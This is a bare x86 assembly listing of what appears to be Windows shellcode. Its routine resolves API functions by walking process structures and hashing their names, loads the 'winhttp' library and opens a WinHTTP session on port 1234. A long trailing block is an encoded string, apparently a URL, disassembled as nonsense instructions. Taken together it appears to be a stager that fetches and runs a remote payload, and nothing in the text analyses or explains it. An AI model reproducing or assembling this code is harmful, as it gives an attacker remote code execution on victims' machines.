```asm
_start:
    cld
    nop
    call L_95
RET_6:
    pushal
    nop
    mov ebp, esp
    xor edx, edx
    nop
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    nop
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    xor edi, edi
    nop
    mov esi, dword ptr [edx + 0x28]
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    nop
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    push edi
    nop
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    nop
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    nop
    mov ebx, dword ptr [eax + 0x20]
    push eax
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    xor edi, edi
    dec ecx
    nop
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    xor eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    nop
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    nop
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    nop
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    nop
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    nop
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    xor ebx, ebx
    nop
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    push eax
    push ebx
    push 0x4d2
    nop
    call L_385
RET_c2:
    push 0x74007400
    add byte ptr [eax], dh
    cmp al, byte ptr [eax]
    das
    add byte ptr [edi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [edi], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [edx], bh
    add byte ptr [ecx], dh
    add byte ptr [edx], dh
    add byte ptr [ebx], dh
    add byte ptr [eax + eax], dh
    das
    add byte ptr [ecx], dh
    add byte ptr [eax], cl
    dec ebx
    add byte ptr [esi], dl
    jb L_f8
L_f8:
    imul eax, dword ptr [eax], 0x47
    add byte ptr [ebx], dh
    dec edi
    add byte ptr [eax], dl
    jo L_104
L_104:
    xor al, byte ptr [eax]
    insd dword ptr es:[edi], dx
    add byte ptr [esi], ch
    add byte ptr gs:[edx], ah
    dec eax
    add byte ptr [eax], dh
    dec eax
    add byte ptr [ebx], dl
    push 0x34007700
    add byte ptr [edi], bl
    add byte ptr [bx + si], bh
    cmp byte ptr [eax], al
    jns L_126
L_126:
    dec eax
    add byte ptr [esi], al
    inc edx
    add byte ptr [ecx], dh
    pop ecx
    add byte ptr [esi], ch
    jbe L_134
L_134:
    inc ecx
    add byte ptr [eax + eax + 0x67], dl
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    push esp
    add byte ptr [ebp], dl
    ja L_144
L_144:
    xor al, 0
    inc esi
    add byte ptr [esi], cl
    jbe L_14c
L_14c:
    imul eax, dword ptr [eax], 0x630046
    pop edx
    add byte ptr [esi], dl
    outsb dx, byte ptr [esi]
    add byte ptr [ebp], ah
    xor byte ptr [eax], al
    jns L_15e
L_15e:
    dec eax
    add byte ptr [eax + eax], dh
    insd dword ptr es:[edi], dx
    add byte ptr [ecx], ah
    add byte ptr ss:[ebx], dh
    jns L_16c
L_16c:
    add byte ptr [edx], al
    dec ecx
    add byte ptr [0x4d006900], ch
    add byte ptr [eax + eax], dh
    inc edx
    add byte ptr [eax + eax + 0x52], dl
    add byte ptr [esi], ch
    inc esp
    add byte ptr [edi], bl
    push ebx
    add byte ptr [edx], dl
    xor dword ptr [eax], eax
    dec eax
    add byte ptr [ebp], dl
    push esi
    add byte ptr [edx], bl
    jp L_196
L_196:
    inc ebp
    add byte ptr [esi], al
    push ebp
    add byte ptr [eax + eax + 0x62], ah
    add byte ptr [eax], ch
    push ecx
    add byte ptr [ebp], cl
    inc esp
    add byte ptr [ecx], bl
    add byte ptr ss:[edx], bh
    jb L_1b0
L_1b0:
    dec edi
    add byte ptr [esi], ch
    pop edx
    add byte ptr [edx], bl
    xor eax, 0x31003100
    add byte ptr [esi], al
    push 0
    imul eax, dword ptr [eax], 0x580046
    jb L_1ca
L_1ca:
    push 0x35004400
    add byte ptr [ebp], al
    jns L_1d4
L_1d4:
    push ebx
    add byte ptr [eax], ch
    push ebx
    add byte ptr [eax + eax + 0x7a], cl
    add byte ptr [edx], al
    dec eax
    add byte ptr [ebp], al
    jae L_1e6
L_1e6:
    dec ebp
    add byte ptr [esi], ch
    je L_1ec
L_1ec:
    xor al, 0
    jno L_1f0
L_1f0:
    add byte ptr fs:[eax], dl
    je L_1f6
L_1f6:
    dec esp
    add byte ptr [eax + eax + 0x52], ch
    add byte ptr [ecx], dl
    dec edx
    add byte ptr [eax], bh
    push esp
    add byte ptr [edx], bl
    inc edi
    add byte ptr [esi], al
    imul eax, dword ptr [eax], 0x700064
    popal
    add byte ptr [ecx], dl
    jae L_216
L_216:
    imul eax, dword ptr [eax], 0x35002d
    ja L_21e
L_21e:
    dec ebx
    add byte ptr [eax + eax], dh
    push ebp
    add byte ptr [eax], bl
    jae L_228
L_228:
    xor al, byte ptr [eax]
    popal
    add byte ptr [ebx], ch
    dec ebp
    add byte ptr [edi], al
    imul eax, dword ptr [eax], 0x39
    add byte ptr [ecx], dl
    dec ecx
    add byte ptr [edi], ah
    jae L_23e
L_23e:
    sub eax, 0x53004d00
    add byte ptr [eax], bl
    jno L_248
L_248:
    aaa
    add byte ptr [ecx], dh
    add byte ptr [eax], dh
    dec edx
    add byte ptr [edx], dh
    imul eax, dword ptr [eax], 0x720059
    dec edx
    add byte ptr [ecx], al
    pop ecx
    add byte ptr [eax], bl
    jbe L_262
L_262:
    inc edi
    add byte ptr [esi], dh
    add byte ptr [esi], ch
    push edx
    add byte ptr [esi], dh
    add byte ptr [edx], dl
    insd dword ptr es:[edi], dx
    add byte ptr [eax + eax + 0x33], dl
    add byte ptr [ebp], dh
    inc edi
    add byte ptr [eax + eax + 0x66], ch
    add byte ptr [eax], ch
    inc edx
    add byte ptr [ebp], ch
    inc esi
    add byte ptr [edi], dl
    dec eax
    add byte ptr [edx], bl
    bound eax, qword ptr [eax]
    pop ecx
    add byte ptr [ebx], dh
    add byte ptr [edx], ah
    pop ecx
    add byte ptr [edi], al
    push 0